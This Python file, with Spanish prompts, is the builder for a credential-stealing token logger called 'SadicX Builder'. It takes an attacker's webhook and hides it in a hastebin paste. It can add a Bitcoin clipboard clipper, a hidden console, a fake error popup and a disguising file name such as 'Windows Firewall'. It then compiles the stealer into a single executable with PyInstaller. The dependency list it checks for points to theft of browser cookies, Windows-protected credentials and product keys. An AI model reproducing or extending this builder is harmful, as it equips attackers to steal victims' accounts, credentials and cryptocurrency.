# Imports
print("Cargando... esto puede tardar un par de minutos.")
import subprocess
import os
import time
import shutil
import random

# Libraries that will be installed
modulesToInstall = ["requests", "alive_progress", "colorama", "pyfiglet"]

# Function to install library
def setup(module: str):
        attempt = subprocess.getoutput(f"pip install {module}")
        if "'pip' no reconocido" in attempt:
            print("[-] Pip no fue encontrado.")
            exit()
        else:
            return

# Installs each module in list that we declared above
for name in modulesToInstall:
    if name == "alive_progress":
        try:
            exec("from alive_progress import alive_bar")
        except ModuleNotFoundError:
            setup("alive-progress")
            exec("from alive_progress import alive_bar")
    elif name == "colorama":
        try:
            exec("from colorama import Fore, Style, init")
        except ModuleNotFoundError:
            setup("colorama")
            exec("from colorama import Fore, Style, init")
    try:
        exec("import " + name)
    except ModuleNotFoundError:
        setup(name)
        exec("import " + name)

# Random list of different fonts for pyfiglet
randList = ["sland", "standard", "doom", "epic", "big"]

# Defining our pyfiglet configuration
f = pyfiglet.Figlet(font=random.choice(randList))
# Colorama module configuration
init()

# Prints the title
def title():
    print(Fore.BLUE + Style.BRIGHT + f.renderText('SadicX  Builder'))
    print(Fore.CYAN + Style.BRIGHT + "          Made by SadicX#8497 | https://github.com/SadicX")

# Cosmetic transition
def transition(text):
    clear()
    title()
    print(Fore.MAGENTA + Style.BRIGHT + f"[!] {text} in 3")
    time.sleep(1)
    clear()
    title()
    print(Fore.MAGENTA + Style.BRIGHT + f"[!] {text} in 2")
    time.sleep(1)
    clear()
    title()
    print(Fore.MAGENTA + Style.BRIGHT + f"[!] {text} in 1")
    time.sleep(1)
    clear()
    title()

# Clear screen based on your platform
def clear():
    if os.name == 'nt':
        os.system('cls')
    elif os.name == "posix":
        os.system('clear')

# The builder that uses pyinstaller
def build():
    check = subprocess.getoutput("pyinstaller")
    if "'pyinstaller' no esta reconocido" in check:
        print(Fore.RED + Style.BRIGHT + "[-] PyInstaller no fue encontrado. Intentando instalar.")
        tryInstall = subprocess.getoutput("pip install pyinstaller")
        print(Fore.GREEN + Style.BRIGHT + "[+] PyInstaller ha sido instalado exitosamente.")
    else:
        print(Fore.GREEN + Style.BRIGHT + "[+] PyInstaller ya está instalado.")
    time.sleep(1)
    clear()
    title()
    print(Fore.GREEN + Style.BRIGHT + "[!] Intentando compilar el registrador de tokens en ejecutable.")
    with alive_bar(4, stats=False, enrich_print=False, spinner="classic") as barr:
        compileFile = subprocess.getoutput('pyinstaller --noconfirm --onefile --console --clean --noupx --exclude-module _bootlocale "result/TokenLogger.py"')
        with open("log.txt", "w", encoding="utf-8") as log:
            log.write(compileFile)
            log.close()
        if "Building EXE from EXE-00.toc completed successfully." in compileFile:
            print(Fore.GREEN + Style.BRIGHT + "[+]Ejecutable creado. Limpiar.")
            pass
        else:
            print(Fore.RED + Style.BRIGHT + "[-] Ha ocurrido un error al intentar compilar el registrador. El error se ha registrado en 'log.txt'")
            exit()
        barr()
        if os.path.exists("TokenLogger.spec"):
            os.remove("TokenLogger.spec")
        else:
            pass
        barr()
        try:
            shutil.rmtree("build")
        except:
            pass
        barr()
        try:
            os.rename("dist", "EXE")
        except:
            pass
        barr()
    clear()
    title()
    print(Fore.GREEN + Style.BRIGHT + "[+] ¡Éxito! Ejecutable guardado en 'EXE'")
    exit()

# Exception template for raising custom exceptions
class ExceptionTemplate(Exception):
    def __str__(self):
        return ' '.join(self.args)

# People couldn't figure out how to make pastes with pastebin so it automatically does it for them
def makePaste(webhook: str):
    r = requests.post("https://hastebin.com/documents", data=webhook).json()
    return "https://hastebin.com/raw/" + r['key']

# Instala los requisitos necesarios para el registrador en caso de que lo compile en un ejecutable (pyinstaller necesita tomar los archivos del módulo)
# or incase you try to run the python script and you dont know how to use pip
def requirements():
    # Instala cualquier módulo que no esté ya instalado
    def install(module: str):
        print(Fore.RED + Style.BRIGHT + f"[-] Module '{module}' no fue encontrado. Intentando instalar.")
        attempt = subprocess.getoutput(f"pip install {module}")
        if "'pip' not recognized" in attempt:
            print(Fore.RED + Style.BRIGHT + "[-] Pip was not found.")
            exit()
        else:
            return print(Fore.GREEN + Style.BRIGHT + f"[+] Module {module} se instaló correctamente.")

    # Comprueba si el módulo ya está instalado y para ver si no lo está, intenta importarlo a este constructor.
    def check(modules: list, bar):
        print(Fore.YELLOW + Style.BRIGHT + "\n[!] Reinicie este script si los requisitos tardan más de 2 minutos en instalarse.\n\n")
        for module in modules:
            try:
                if module == "Pillow":
                    exec(f"import PIL")
                    print(Fore.YELLOW + Style.BRIGHT + f"[+] Module {module} Ya esta instalado, Continuando")
                    bar()
                    continue
                elif module == "pypiwin32":
                    exec("import win32api\nimport win32con\nfrom win32crypt import CryptUnprotectData\nimport win32crypt\nfrom win32com.client import GetObject")
                    print(Fore.YELLOW + Style.BRIGHT + f"[+] Module pypiwin32 Ya esta instalado, Continuando.")
                    bar()
                elif module == "pywin32":
                    exec("import win32api\nimport win32con\nfrom win32crypt import CryptUnprotectData\nimport win32crypt\nfrom win32com.client import GetObject")
                    print(Fore.YELLOW + Style.BRIGHT + f"[+] Module pywin32 Ya esta instalado, Continuando.")
                    bar()
                elif module == "pycryptodome":
                    exec("from Crypto.Cipher import AES")
                    print(Fore.YELLOW + Style.BRIGHT + f"[+] Module pycryptodome Ya esta instalado, Continuando.")
                    bar()
                else:
                    exec(f"import {module}")
                    print(Fore.YELLOW + Style.BRIGHT + f"[+] Module {module} Ya esta instalado, Continuando.")
                    bar()
            except ModuleNotFoundError:
                if module == "Pillow":
                    install("Pillow")
                    bar()
                    continue
                elif module == "pypiwin32":
                    install("pypiwin32")
                    install("pywin32")
                    bar()
                elif module == "pywin32":
                    install("pypiwin32")
                    install("pywin32")
                    bar()
                elif module == "pycryptodome":
                    install("pycryptodome")
                    bar()
                else:
                    install(module)
                    bar()
        return
    
    
    transition("Comprobando los requisitos")
    listOfModules = ["wmi", "windows_tools.product_key", "winregistry", "psutil", "Pillow", "pypiwin32", "browser_cookie3", "pycryptodome", "pywin32", "requests", "psutial"]
    with alive_bar(len(listOfModules), stats=False, enrich_print=False, spinner="classic") as bar:
        check(listOfModules, bar)
    time.sleep(3)
    return True

# Main part of the builder
def start():
    with open("assets/start.txt", "r", encoding="utf8") as file:
        code = file.read()
        file.close()
    webhook = input(Fore.GREEN + Style.BRIGHT + "[?] Webhook: ")
    code += "pastebin = '" + makePaste(webhook) + "'\n"
    clear()
    title()
    debug = input(Fore.GREEN + Style.BRIGHT + "[?] Depurador? (Presione enter por defecto) (y/n): ")
    if debug == "y":
        code += "debugger = True\n"
    elif debug == "n":
        code += "debugger = False\n"
    else:
        code += "debugger = False\n"
    clear()
    title()
    btc = input(Fore.GREEN + Style.BRIGHT + "[?] BTC Clipper? (Presione enter por defecto) (y/n): ")
    if btc == "y":
        code += "btc = True\n"
        btcadd = input(Fore.GREEN + Style.BRIGHT + "[?] Dirección BTC: ")
        code += f"BTC_ADDRESS = '{btcadd}'\n"
    elif btc == "n":
        code += "btc = False\n"
    else:
        code += "btc = False\n"
    clear()
    title()
    hide = input(Fore.GREEN + Style.BRIGHT + "[?] ¿Ocultar consola? (Presione enter por defecto) (y/n): ")
    if hide == "y":
        code += "hiddenWindow = True\n"
    elif hide == "n":
        code += "hiddenWindow = False\n"
    else:
        code += "hiddenWindow = True\n"
    clear()
    title()
    error = input(Fore.GREEN + Style.BRIGHT + "[?] ¿Mostrar error falso? (Presione enter por defecto) (y/n): ")
    if error == "y":
        code += "fakeError = True\n"
        errorMsg = input(Fore.GREEN + Style.BRIGHT + "[?] ¿Mensaje de error falso ?: ")
        code += f"fakeErrorMessage = '{errorMsg}'\n"
        errorTitle = input(Fore.GREEN + Style.BRIGHT + "[?] ¿Título del mensaje de error?: ")
        code += f"fakeErrorTitle = '{errorTitle}'\n"
    elif error == "n":
        code += "fakeError = False\nfakeErrorMessage = '.'\nfakeErrorTitle = '.'\n"
    else:
        code += "fakeError = False\nfakeErrorMessage = '.'\nfakeErrorTitle = '.'\n"
    clear()
    title()
    fakeFileName = input(Fore.GREEN + Style.BRIGHT + "[?] ¿Nombre de archivo falso? (Presione enter por defecto): ")
    if fakeFileName == "":
        code += "FakeFileName = 'Windows Firewall'\n"
    else:
        code += f"FakeFileName = '{fakeFileName}'\n"
    with open("assets/end.txt", "r", encoding="utf8") as endFile:
        endOfCode = endFile.read()
    code += endOfCode
    with open("result/TokenLogger.py", "w") as file:
        file.write(code)
        file.close()
    clear()
    title()
    print(Fore.GREEN + Style.BRIGHT + "[+] Token Logger se ha guardado en 'TokenLogger.py'\n")
    compileMaybe = input(Fore.YELLOW + Style.BRIGHT + "[?] ¿Compilar en ejecutable? (y/n): ")
    if compileMaybe == "y":
        transition("Transfiriendo al compilador")
        build()
    else:
        exit()
        
if __name__ == '__main__':
    # idk
    if requirements() == True:
        try:
            transition("Transferiendo al constructor")
            start()
        except FileNotFoundError as e:
            # Our custom exception
            class AssetsMissing(ExceptionTemplate):
                __module__ = Exception.__module__ 
                pass
            raise AssetsMissing("Asegúrese de que la carpeta de activos esté intacta y tenga todos los archivos necesarios.") from None
        except PermissionError as e:
            class AccessDenied(ExceptionTemplate):
                __module__ = Exception.__module__ 
                pass
            raise AccessDenied("Acceso denegado. Ejecute este script como administrador para que funcione.") from None
